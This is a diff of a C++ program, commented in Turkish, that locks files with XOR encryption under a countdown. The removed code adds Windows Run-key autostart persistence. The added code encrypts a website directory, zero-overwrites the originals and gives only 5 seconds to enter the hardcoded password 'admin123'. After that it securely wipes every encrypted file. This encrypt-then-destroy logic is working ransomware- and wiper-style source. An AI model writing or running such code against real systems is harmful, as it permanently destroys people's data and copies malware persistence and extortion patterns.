@@ -5,62 +5,71 @@
 #include <thread>
 #include <string>
 #include <iomanip>
-#include <windows.h>
-#include <conio.h>
+#include <vector>
+#include <algorithm>
 
 namespace fs = std::filesystem;
 
-// ==========================================
-// Embedded constants for the program
-// ==========================================
-const std::string ADMIN_PASSWORD = "admin123"; // the password to unlock the files during countdown
-const std::string TARGET_PATH = "./"; // the directory to lock files in "./" means the current directory
-const int LOCK_DURATION_SECONDS = 300;           // lock duration in seconds
-const std::string CRYPTO_KEY = "Fast_XOR_Key_2026"; // the key used for XOR encryption/decryption
-const char* REG_APP_KEY = "Software\\TimedFileLock"; // Registry key to store the end time of the lock
-// ==========================================
+// İşletim sistemine göre kütüphane seçimi
+#ifdef _WIN32
+    #include <conio.h>
+    #include <windows.h>
+#else
+    #include <termios.h>
+    #include <unistd.h>
+    #include <sys/select.h>
+#endif
 
-// 1. Registry and autostart functions
-void setAutostartAndTimer(long long targetEndTime) {
-    // A) add to Windows startup registry
-    HKEY hRunKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hRunKey) == ERROR_SUCCESS) {
-        char exePath[MAX_PATH];
-        GetModuleFileNameA(NULL, exePath, MAX_PATH);
-        RegSetValueExA(hRunKey, "TimedFileLockProgram", 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
-        RegCloseKey(hRunKey);
-    }
+const std::string ADMIN_PASSWORD = "admin123";
+const std::string TARGET_PATH = "/home/yigit/vellora-website";
+const int LOCK_DURATION_SECONDS = 5;
+const std::string CRYPTO_KEY = "Hizli_XOR_Anahtari_2026";
 
-    // B) save the target end time in the registry for persistence
-    HKEY hAppKey;
-    if (RegCreateKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hAppKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExA(hAppKey, "EndTime", 0, REG_QWORD, (const BYTE*)&targetEndTime, sizeof(targetEndTime));
-        RegCloseKey(hAppKey);
+#ifndef _WIN32
+void setTerminalMode(bool enable) {
+    struct termios tty;
+    tcgetattr(STDIN_FILENO, &tty);
+    if (!enable) {
+        tty.c_lflag &= ~(ICANON | ECHO);
+    } else {
+        tty.c_lflag |= (ICANON | ECHO);
     }
+    tcsetattr(STDIN_FILENO, TCSANOW, &tty);
 }
 
-void cleanRegistrySettings() {
-    // Process completed, remove both startup entry and end time data from the system
-    HKEY hRunKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hRunKey) == ERROR_SUCCESS) {
-        RegDeleteValueA(hRunKey, "TimedFileLockProgram");
-        RegCloseKey(hRunKey);
+bool kbhit() {
+    struct timeval tv = {0, 0};
+    fd_set fds;
+    FD_ZERO(&fds);
+    FD_SET(STDIN_FILENO, &fds);
+    return select(STDIN_FILENO + 1, &fds, NULL, NULL, &tv) > 0;
+}
+#endif
+
+// Dosyanın üzerini sıfırlarla kaplayıp diskten güvenli şekilde siler
+bool secureDelete(const fs::path& filePath) {
+    std::error_code ec;
+    uintmax_t fileSize = fs::file_size(filePath, ec);
+    
+    if (!ec && fileSize > 0) {
+        std::ofstream file(filePath, std::ios::binary | std::ios::in | std::ios::out);
+        if (file.is_open()) {
+            constexpr size_t BLOCK_SIZE = 4096;
+            std::vector<char> zeroBuffer(BLOCK_SIZE, 0);
+            uintmax_t bytesWritten = 0;
+
+            while (bytesWritten < fileSize) {
+                uintmax_t toWrite = std::min(static_cast<uintmax_t>(zeroBuffer.size()), fileSize - bytesWritten);
+                file.write(zeroBuffer.data(), toWrite);
+                bytesWritten += toWrite;
+            }
+            file.flush();
+            file.close();
+        }
     }
-    RegDeleteKeyA(HKEY_CURRENT_USER, REG_APP_KEY);
+    return fs::remove(filePath, ec);
 }
 
-long long getSavedEndTime() {
-    HKEY hKey;
-    long long endTime = 0;
-    DWORD dataSize = sizeof(endTime);
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, REG_APP_KEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegQueryValueExA(hKey, "EndTime", NULL, NULL, (LPBYTE)&endTime, &dataSize);
-        RegCloseKey(hKey);
-    }
-    return endTime;
-}
-
-// 2. encryption / decryption functions
 void processSingleFile(const fs::path& filePath, bool encrypt) {
     std::ifstream inFile(filePath, std::ios::binary);
     if (!inFile) return;
@@ -77,7 +86,14 @@ void processSingleFile(const fs::path& filePath, bool encrypt) {
     if (outFile) {
         outFile.write(data.data(), data.size());
         outFile.close();
-        fs::remove(filePath);
+        
+        if (encrypt) {
+            // Şifrelerken orijinal açık dosyayı güvenli şekilde sil
+            secureDelete(filePath);
+        } else {
+            // Şifre çözerken .locked uzantılı dosyayı standart sil
+            fs::remove(filePath);
+        }
     }
 }
 
@@ -95,73 +111,94 @@ void processFiles(bool encrypt) {
     }
 }
 
-// 3. main function
-int main() {
-    std::cout << "--- Timed File Lock System ---\n";
-    
-    // Get the current time and the saved end time from the registry
-    long long now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
-    long long endTime = getSavedEndTime();
+// Süre bittiğinde kilitli tüm dosyaları imha eder
+void destroyLockedFiles() {
+    if (!fs::exists(TARGET_PATH)) return;
 
-    // If there is no saved end time, set it to now + LOCK_DURATION_SECONDS and save it in the registry
-    if (endTime == 0) {
-        endTime = now + LOCK_DURATION_SECONDS;
-        setAutostartAndTimer(endTime);
-        processFiles(true); // encrypt files
-        std::cout << "Files locked and system integrated with startup!\n\n";
-    } else {
-        std::cout << "previous lock session detected, resuming from where it left off...\n\n";
+    for (const auto& entry : fs::recursive_directory_iterator(TARGET_PATH)) {
+        if (entry.is_regular_file()) {
+            std::string pathStr = entry.path().string();
+            if (pathStr.length() >= 7 && pathStr.substr(pathStr.length() - 7) == ".locked") {
+                secureDelete(entry.path());
+            }
+        }
     }
+}
 
-    int remaining = static_cast<int>(endTime - now);
-    if (remaining < 0) remaining = 0;
+int main() {
+    std::cout << "--- SURELI DOSYA KILIT SISTEMI ---\n";
+    processFiles(true);
+    std::cout << "Dosyalar kilitlendi! ('.locked' uzantisi eklendi)\n\n";
 
+#ifndef _WIN32
+    setTerminalMode(false);
+#endif
+
+    int remaining = LOCK_DURATION_SECONDS;
     std::string inputBuffer = "";
     std::string statusMsg = "";
     bool isUnlocked = false;
 
-    // countdown loop
+    auto lastTick = std::chrono::steady_clock::now();
+
     while (remaining > 0 && !isUnlocked) {
+        // Klavyeden Girdi Kontrolü
+#ifdef _WIN32
         if (_kbhit()) {
             char ch = _getch();
+#else
+        if (kbhit()) {
+            char ch = std::cin.get();
+#endif
             if (ch == '\n' || ch == '\r') {
                 if (inputBuffer == ADMIN_PASSWORD) {
                     isUnlocked = true;
                     break;
                 } else {
-                    statusMsg = " [!] Incorrect password!";
+                    statusMsg = " [HATALI SIFRE!]";
                     inputBuffer.clear();
                 }
             } else if (ch == 127 || ch == '\b') {
-                if (!inputBuffer.empty()) inputBuffer.pop_back();
+                if (!inputBuffer.empty()) {
+                    inputBuffer.pop_back();
+                }
             } else if (ch >= 32 && ch <= 126) {
                 inputBuffer += ch;
                 statusMsg = "";
             }
         }
 
-        // compute remaining time
-        now = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
-        remaining = static_cast<int>(endTime - now);
-        if (remaining < 0) remaining = 0;
+        // Geri Sayım Zamanlayıcısı
+        auto now = std::chrono::steady_clock::now();
+        if (std::chrono::duration_cast<std::chrono::seconds>(now - lastTick).count() >= 1) {
+            remaining--;
+            lastTick = now;
+        }
 
+        // Ekrana Yazdırma
         int mins = remaining / 60;
         int secs = remaining % 60;
-        
-        // print the countdown and input status
-        std::cout << "\r\033[K" << "Remaining time: " << std::setfill('0') << std::setw(2) << mins << ":" 
+        std::cout << "\r\033[K" << "Kalan Sure: " << std::setfill('0') << std::setw(2) << mins << ":" 
                   << std::setfill('0') << std::setw(2) << secs 
-                  << " | Password: " << std::string(inputBuffer.length(), '*') << statusMsg << std::flush;
+                  << " | Sifre: " << std::string(inputBuffer.length(), '*') << statusMsg << std::flush;
 
-        std::this_thread::sleep_for(std::chrono::milliseconds(50));
+        std::this_thread::sleep_for(std::chrono::milliseconds(20));
     }
 
-    // unlock and clean
-    std::cout << "\n\nUNLOCKING...\n";
-    processFiles(false); // decrypt the files
-    cleanRegistrySettings(); // clean the auto-start and time data has left
-    std::cout << "All files decrypted and system cleaned!\n";
+#ifndef _WIN32
+    setTerminalMode(true);
+#endif
 
-    std::this_thread::sleep_for(std::chrono::seconds(3));
+    // Sonuç Durumu Kontrolü
+    if (isUnlocked) {
+        std::cout << "\n\nDOGRU SIFRE! KILIT KALDIRILIYOR...\n";
+        processFiles(false);
+        std::cout << "Tum dosyalar desifre edildi!\n";
+    } else {
+        std::cout << "\n\nSURE BITTI! KILITLI DOSYALAR GUVENLI SEKILDE SILINIYOR...\n";
+        destroyLockedFiles();
+        std::cout << "Tum kilitli dosyalar kalici olarak imha edildi!\n";
+    }
+
     return 0;
 }
